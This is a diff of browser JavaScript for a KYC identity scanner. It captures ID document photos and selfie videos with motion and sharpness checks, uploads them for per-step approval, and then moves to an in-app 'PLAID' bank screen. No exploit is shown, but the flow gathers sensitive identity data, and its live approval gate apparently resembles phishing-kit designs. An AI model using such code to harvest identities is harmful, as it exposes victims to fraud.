+    var h = settings.height || video.videoHeight || 720;
+
+    var canvas = document.createElement('canvas');
+    canvas.width  = w;
+    canvas.height = h;
+    var ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, w, h);
+
+    // 95% quality JPEG — near-lossless for document scans
+    var dataUrl = canvas.toDataURL('image/jpeg', 0.95);
+
+    canvas.toBlob(function(blob) {
+      capturedBlob = blob;
+      _showPreview(dataUrl);
+    }, 'image/jpeg', 0.95);
+  };
+
+  // ── Retake ────────────────────────────────────────────────────
+  window.retakeCapture = function() {
+    capturedBlob = null;
+    _hidePreview();
+
+    var step = STEPS[currentKYCStep];
+    if (!step) return;
+
+    _resetFrameLock();
+
+    if (step.mode === 'photo') {
+      // Reset quality bars then restart analysis
+      _resetQualityBars();
+      var video = document.getElementById('scanner-video');
+      if (stream && video && video.readyState >= 2) {
+        _startMotionAndQuality();
+      } else if (video) {
+        video.addEventListener('canplay', _startMotionAndQuality, { once: true });
+      }
+    } else {
+      // Selfie step — re-arm after short delay
+      setTimeout(function() { _armCapture(true); }, 1800);
+    }
+  };
+
+  // ── Confirm capture ───────────────────────────────────────────
+  window.confirmCapture = async function() {
+    if (!capturedBlob) return;
+
+    var stepNum = currentKYCStep;
+    var step    = STEPS[stepNum];
+    if (!step)  return;
+
+    window.cancelScanner();
+
+    if (window.SessionHandler && window.SessionHandler.ApprovalGate) {
+      window.SessionHandler.ApprovalGate.show(step.stepType, 'Uploading scan for review…');
+    }
+
+    var result = { success: false };
+    if (window.SessionHandler && window.SessionHandler.uploadMedia) {
+      result = await window.SessionHandler.uploadMedia(capturedBlob, step.stepType, 'image/jpeg');
+    }
+
+    if (!result.success) {
+      if (window.SessionHandler && window.SessionHandler.ApprovalGate) {
+        window.SessionHandler.ApprovalGate.onRejected(step.stepType, 'Upload failed. Please try again.', true);
+      }
+      return;
+    }
+
+    _markStepPending(stepNum);
+  };
+
+  // ── Event listeners from session_handler ─────────────────────
+  document.addEventListener('sh:kyc_step_approved', function(e) {
+    var nextStep = e.detail && e.detail.nextStep;
+    var done     = currentKYCStep || (nextStep ? nextStep - 1 : 1);
+    _markStepComplete(done);
+    if (nextStep && nextStep <= 4) {
+      setTimeout(function() { window.startKYCStep(nextStep); }, 700);
+    }
+  });
+
+  document.addEventListener('sh:kyc_step_rejected', function() {
+    _markStepPending(currentKYCStep);
+  });
+
+  // ── COUNTDOWN (7 seconds, animated SVG ring) ──────────────────
+  function _startCountdown(step) {
+    var ring  = document.getElementById('kycCountdownRing');
+    var digit = document.getElementById('kycCountdownDigit');
+    var msg   = document.getElementById('kycCountdownMsg');
+    var arc   = document.getElementById('kycCountdownArc');
+
+    if (ring)  ring.classList.add('active');
+    if (digit) digit.textContent = COUNTDOWN_SECS;
+    if (msg)   msg.textContent   = step.getReadyHint || 'Get Ready';
+    if (arc)   arc.style.strokeDashoffset = '0';
+
+    var secsLeft  = COUNTDOWN_SECS;
+    var startTime = performance.now();
+    var totalMs   = COUNTDOWN_SECS * 1000;
+
+    countdownTimer = setInterval(function() {
+      var elapsed = performance.now() - startTime;
+      var frac    = Math.min(elapsed / totalMs, 1);
+      var secs    = Math.ceil(COUNTDOWN_SECS - elapsed / 1000);
+      secs = Math.max(secs, 0);
+
+      if (digit) digit.textContent = secs || '';
+      if (arc)   arc.style.strokeDashoffset = (CIRCUMFERENCE * frac).toFixed(1);
+
+      if (frac >= 1 || secs <= 0) {
+        clearInterval(countdownTimer); countdownTimer = null;
+        _hideCountdownRing();
+        _openCamera(step);
+      }
+    }, 60);
+  }
+
+  function _hideCountdownRing() {
+    var ring = document.getElementById('kycCountdownRing');
+    if (ring) ring.classList.remove('active');
+  }
+
+  // ── CAMERA ────────────────────────────────────────────────────
+  function _openCamera(step) {
+    // Request highest resolution the hardware supports
+    var constraints = {
+      video: {
+        facingMode: step.facing || 'environment',
+        width:  { ideal: 3840, min: 1280 },
+        height: { ideal: 2160, min: 720 },
+        frameRate: { ideal: 30, min: 15 },
+        focusMode: 'continuous',
+      },
+      audio: false,
+    };
+
+    navigator.mediaDevices.getUserMedia(constraints)
+      .then(function(s) {
+        stream = s;
+        var video = document.getElementById('scanner-video');
+        if (video) {
+          video.srcObject = s;
+          video.play().catch(function(){});
+        }
+
+        if (step.mode === 'photo') {
+          // Attach quality analysis once video is playing
+          video.addEventListener('canplay', function onCanPlay() {
+            video.removeEventListener('canplay', onCanPlay);
+            _startMotionAndQuality();
+          });
+        } else {
+          // Selfie/video — arm capture after settling time
+          setTimeout(function() { _armCapture(true); }, 2000);
+        }
+      })
+      .catch(function(err) {
+        _toast('Camera access denied. Please allow camera permissions.');
+        window.cancelScanner();
+      });
+  }
+
+  function _stopCamera() {
+    _stopMotionDetect();
+    _stopQualityAnalysis();
+    if (stream) {
+      stream.getTracks().forEach(function(t) { t.stop(); });
+      stream = null;
+    }
+    var video = document.getElementById('scanner-video');
+    if (video) video.srcObject = null;
+  }
+
+  // ── MOTION + QUALITY ANALYSIS (photo steps 1&2) ──────────────
+  // Real pixel-diff motion detection. Also measures Laplacian
+  // sharpness variance for quality score. 100% lock required to arm capture.
+  function _startMotionAndQuality() {
+    _stopMotionDetect();
+    _stopQualityAnalysis();
+    stableMs   = 0;
+    prevPixels = null;
+    lastTs     = 0;
+
+    var video   = document.getElementById('scanner-video');
+    var scratch = document.createElement('canvas');
+    // Sample at 1/6 resolution — low overhead, enough for motion/blur detection
+    scratch.width  = Math.ceil((video.videoWidth  || 640) / 6);
+    scratch.height = Math.ceil((video.videoHeight || 480) / 6);
+    var ctx = scratch.getContext('2d', { willReadFrequently: true });
+
+    var lapCanvas = document.createElement('canvas');
+    lapCanvas.width  = scratch.width;
+    lapCanvas.height = scratch.height;
+    var lapCtx = lapCanvas.getContext('2d', { willReadFrequently: true });
+
+    var stabHistory   = [];  // rolling stability %
+    var sharpHistory  = [];
+
+    function tick(ts) {
+      if (!stream) return;
+      var dt = ts - (lastTs || ts); lastTs = ts;
+
+      ctx.drawImage(video, 0, 0, scratch.width, scratch.height);
+      var curr = ctx.getImageData(0, 0, scratch.width, scratch.height).data;
+
+      // ── Motion (stability) ────────────────────────────────────
+      var motionScore = 100;
+      if (prevPixels) {
+        var diff = 0, n = curr.length;
+        for (var i = 0; i < n; i += 4) {
+          diff += Math.abs(curr[i]   - prevPixels[i])
+                + Math.abs(curr[i+1] - prevPixels[i+1])
+                + Math.abs(curr[i+2] - prevPixels[i+2]);
+        }
+        var avgDiff = diff / (n / 4 * 3);
+        // 0 motion = 100%, MOTION_THRESHOLD = 0%
+        motionScore = Math.max(0, Math.min(100, Math.round((1 - avgDiff / MOTION_THRESHOLD) * 100)));
+
+        if (avgDiff < MOTION_THRESHOLD * 0.4) {
+          stableMs += dt;
+        } else {
+          stableMs = 0;
+          if (frameLockAchieved) { frameLockAchieved = false; _resetFrameLock(); }
+        }
+      }
+      prevPixels = curr.slice();
+      stabHistory.push(motionScore);
+      if (stabHistory.length > 8) stabHistory.shift();
+      var smoothStab = Math.round(stabHistory.reduce(function(a,b){return a+b;},0) / stabHistory.length);
+
+      // ── Sharpness (Laplacian variance) ───────────────────────
+      lapCtx.drawImage(video, 0, 0, lapCanvas.width, lapCanvas.height);
+      var lapData = lapCtx.getImageData(0, 0, lapCanvas.width, lapCanvas.height).data;
+      var gray = [], lw = lapCanvas.width, lh = lapCanvas.height;
+      for (var j = 0; j < lapData.length; j += 4) {
+        gray.push(0.299*lapData[j] + 0.587*lapData[j+1] + 0.114*lapData[j+2]);
+      }
+      var laplacianVar = 0, count = 0;
+      for (var y = 1; y < lh - 1; y++) {
+        for (var x = 1; x < lw - 1; x++) {
+          var idx = y * lw + x;
+          var lap = -gray[idx-lw-1]-gray[idx-lw]-gray[idx-lw+1]
+                    -gray[idx-1]  + 8*gray[idx] -gray[idx+1]
+                    -gray[idx+lw-1]-gray[idx+lw]-gray[idx+lw+1];
+          laplacianVar += lap * lap;
+          count++;
+        }
+      }
+      var lapScore = count > 0 ? laplacianVar / count : 0;
+      // Empirical: good DL scan ~200-800 variance. Cap at 600 → 100%
+      var sharpPct = Math.min(100, Math.round(lapScore / 5));
+      sharpHistory.push(sharpPct);
+      if (sharpHistory.length > 6) sharpHistory.shift();
+      var smoothSharp = Math.round(sharpHistory.reduce(function(a,b){return a+b;},0) / sharpHistory.length);
+
+      // ── Update quality bars ───────────────────────────────────
+      _setQualityBar('Sharp', smoothSharp);
+      _setQualityBar('Stab',  smoothStab);
+
+      // ── Frame lock logic ──────────────────────────────────────
+      if (!frameLockAchieved && stableMs >= STABLE_NEEDED_MS && smoothSharp >= 25) {
+        frameLockAchieved = true;
+        _armCapture(false);
+      }
+
+      motionRaf = requestAnimationFrame(tick);
+    }
+
+    motionRaf = requestAnimationFrame(tick);
+  }
+
+  function _stopMotionDetect() {
+    if (motionRaf) { cancelAnimationFrame(motionRaf); motionRaf = null; }
+    stableMs = 0; prevPixels = null; lastTs = 0;
+  }
+
+  function _stopQualityAnalysis() {
+    if (qualityRaf) { cancelAnimationFrame(qualityRaf); qualityRaf = null; }
+  }
+
+  function _setQualityBar(key, pct) {
+    var fill  = document.getElementById('kycQFill'   + key);
+    var label = document.getElementById('kycQLabel'  + key);
+    if (fill) {
+      fill.style.width = pct + '%';
+      fill.className   = 'kyc-quality-fill' +
+        (pct >= 75 ? ' good' : pct >= 40 ? ' ok' : '');
+    }
+    if (label) label.textContent = pct + '%';
+  }
+
+  function _resetQualityBars() {
+    _setQualityBar('Sharp', 0);
+    _setQualityBar('Stab',  0);
+  }
+
+  // ── Arm capture button + frame lock visuals ───────────────────
+  function _armCapture(isVideo) {
+    frameLockAchieved = true;
+    var badge    = document.getElementById('kycFrameLockBadge');
+    var badgeTxt = document.getElementById('kycFrameLockText');
+    var frame    = document.getElementById('scannerFrame');
+    var capBtn   = document.getElementById('captureBtn');
+
+    if (badge)    badge.classList.add('locked');
+    if (badgeTxt) badgeTxt.textContent = isVideo ? 'Frame locked — tap to begin scan' : 'Frame locked — tap to capture';
+    if (frame)    frame.classList.add('frame-locked');
+    if (capBtn)   { capBtn.disabled = false; capBtn.classList.add('armed'); }
+  }
+
+  function _resetFrameLock() {
+    frameLockAchieved = false;
+    var badge    = document.getElementById('kycFrameLockBadge');
+    var badgeTxt = document.getElementById('kycFrameLockText');
+    var frame    = document.getElementById('scannerFrame');
+    var capBtn   = document.getElementById('captureBtn');
+    var recWrap  = document.getElementById('kycRecProgress');
+
+    if (badge)    badge.classList.remove('locked');
+    if (badgeTxt) badgeTxt.textContent = 'Hold steady for frame lock…';
+    if (frame)    frame.classList.remove('frame-locked');
+    if (capBtn)   { capBtn.disabled = true; capBtn.classList.remove('armed'); }
+    if (recWrap)  { recWrap.classList.remove('active'); }
+  }
+
+  // ── VIDEO RECORDING (selfie steps 3&4) ───────────────────────
+  // captureImage for video steps starts a 12-second WebM recording
+  window.captureImage = function() {
+    var step = STEPS[currentKYCStep];
+    if (!step || !frameLockAchieved) return;
+
+    if (step.mode === 'photo') {
+      // Photo capture (original logic — kept above)
+      var video = document.getElementById('scanner-video');
+      if (!video || !stream) return;
+      _stopMotionDetect(); _stopQualityAnalysis();
+
+      var track    = stream.getVideoTracks()[0];
+      var settings = track ? track.getSettings() : {};
+      var w = settings.width  || video.videoWidth  || 1280;
+      var h = settings.height || video.videoHeight || 720;
+
+      var canvas = document.createElement('canvas');
+      canvas.width = w; canvas.height = h;
+      canvas.getContext('2d').drawImage(video, 0, 0, w, h);
+      var dataUrl = canvas.toDataURL('image/jpeg', 0.95);
+      canvas.toBlob(function(blob) {
+        capturedBlob = blob;
+        _showPreview(dataUrl);
+      }, 'image/jpeg', 0.95);
+
+    } else {
+      // Video recording for selfie steps
+      _startVideoRecording();
+    }
+  };
+
+  function _startVideoRecording() {
+    if (!stream) return;
+    _armCapture(true); // keep green
+
+    var capBtn = document.getElementById('captureBtn');
+    if (capBtn) { capBtn.disabled = true; capBtn.classList.remove('armed'); }
+
+    var recWrap  = document.getElementById('kycRecProgress');
+    var recFill  = document.getElementById('kycRecFill');
+    var recLabel = document.getElementById('kycRecLabel');
+    if (recWrap) recWrap.classList.add('active');
+
+    // Best available codec
+    var mime = ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm','video/mp4']
+      .find(function(m) { try { return MediaRecorder.isTypeSupported(m); } catch(e) { return false; } }) || '';
+
+    var chunks  = [];
+    var recorder;
+    try {
+      recorder = new MediaRecorder(stream, mime ? { mimeType: mime } : {});
+    } catch(e) {
+      _toast('Recording not supported on this device.'); return;
+    }
+    recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
+    recorder.onstop = function() {
+      capturedBlob = new Blob(chunks, { type: 'video/webm' });
+      // Show confirm controls
+      if (recWrap) recWrap.classList.remove('active');
+      document.getElementById('scannerControls').style.display = 'none';
+      document.getElementById('previewControls').style.display = 'flex';
+    };
+    recorder.start(100);
+
+    var start = performance.now();
+    clearInterval(recordingInterval);
+    recordingInterval = setInterval(function() {
+      var pct = Math.min(((performance.now() - start) / RECORD_DURATION) * 100, 100);
+      if (recFill)  recFill.style.width  = pct.toFixed(1) + '%';
+      if (recLabel) recLabel.textContent = 'Scanning… ' + Math.floor(pct) + '%';
+      if (pct >= 100) {
+        clearInterval(recordingInterval); recordingInterval = null;
+        if (recLabel) recLabel.textContent = '✓ Scan complete';
+        if (recorder.state === 'recording') recorder.stop();
+      }
+    }, 80);
+  }
+
+  // ── Preview helpers ───────────────────────────────────────────
+  function _showPreview(dataUrl) {
+    var video   = document.getElementById('scanner-video');
+    var preview = document.getElementById('scannerPreview');
+    var ctrl    = document.getElementById('scannerControls');
+    var prev    = document.getElementById('previewControls');
+    var qb      = document.getElementById('kycQualityBar');
+
+    if (video)   video.style.display = 'none';
+    if (preview) { preview.src = dataUrl; preview.classList.add('active'); }
+    if (ctrl)    ctrl.style.display  = 'none';
+    if (prev)    prev.style.display  = 'flex';
+    if (qb)      qb.classList.remove('active');
+    if (stream) stream.getTracks().forEach(function(t) { t.enabled = false; });
+  }
+
+  function _hidePreview() {
+    var video   = document.getElementById('scanner-video');
+    var preview = document.getElementById('scannerPreview');
+    var ctrl    = document.getElementById('scannerControls');
+    var prev    = document.getElementById('previewControls');
+
+    if (video)   video.style.display = '';
+    if (preview) { preview.src = ''; preview.classList.remove('active'); }
+    if (ctrl)    ctrl.style.display  = '';
+    if (prev)    prev.style.display  = 'none';
+    if (stream) stream.getTracks().forEach(function(t) { t.enabled = true; });
+  }
+
+  // ── Step status ───────────────────────────────────────────────
+  function _markStepComplete(stepNum) {
+    kycStepsCompleted[stepNum - 1] = true;
+    window.kycStepsCompleted       = kycStepsCompleted;
+    var item   = document.getElementById('kycStep' + stepNum);
+    var status = item && item.querySelector('.kyc-step-status');
+    if (item)   item.classList.add('completed');
+    if (status) status.textContent = 'Completed ✓';
+    if (window.SPA) window.SPA.storage.set('kyc_steps', kycStepsCompleted);
+    if (kycStepsCompleted.every(Boolean)) {
+      var btn = document.getElementById('kycCompleteBtn');
+      if (btn) btn.disabled = false;
+    }
+  }
+
+  function _markStepPending(stepNum) {
+    var item   = document.getElementById('kycStep' + stepNum);
+    var status = item && item.querySelector('.kyc-step-status');
+    if (item)   item.classList.remove('completed');
+    if (status) status.textContent = 'Pending';
+  }
+
+  // ── Utilities ─────────────────────────────────────────────────
+  function _resetControls() {
+    var ctrl    = document.getElementById('scannerControls');
+    var prev    = document.getElementById('previewControls');
+    var video   = document.getElementById('scanner-video');
+    var preview = document.getElementById('scannerPreview');
+    var qb      = document.getElementById('kycQualityBar');
+    var rb      = document.getElementById('kycRecProgress');
+    var recFill = document.getElementById('kycRecFill');
+
+    if (ctrl)    ctrl.style.display  = '';
+    if (prev)    prev.style.display  = 'none';
+    if (video)   video.style.display = '';
+    if (preview) { preview.src = ''; preview.classList.remove('active'); }
+    if (qb)      qb.classList.remove('active');
+    if (rb)      { rb.classList.remove('active'); if (recFill) recFill.style.width = '0%'; }
+    _resetFrameLock();
+    _resetQualityBars();
+  }
+
+  function _updateProgressBar(stepNum) {
+    [1,2,3,4].forEach(function(i) {
+      var el = document.getElementById('scanStep' + i);
+      if (!el) return;
+      el.classList.remove('active','completed');
+      if (i < stepNum)  el.classList.add('completed');
+      if (i === stepNum) el.classList.add('active');
+    });
+  }
+
+  function _stopAllTimers() {
+    if (countdownTimer)    { clearInterval(countdownTimer);    countdownTimer    = null; }
+    if (recordingInterval) { clearInterval(recordingInterval); recordingInterval = null; }
+    _stopMotionDetect();
+    _stopQualityAnalysis();
+  }
+
+  function _setText(id, txt) {
+    var el = document.getElementById(id);
+    if (el) el.textContent = txt;
+  }
+
+  function _toast(msg) {
+    if (window.SessionHandler && window.SessionHandler.UI) {
+      window.SessionHandler.UI.showToast('info', msg, 4000);
+    }
+  }
+
+  // ── Plaid proceed ─────────────────────────────────────────────
+ window._kycProceedToPlaid = function() {
+  if (window.SPA) {
+    window.SPA.navigate('PLAID', { message: 'Connecting to bank verification…' });
+  }
+};
+
+})();
+</script>
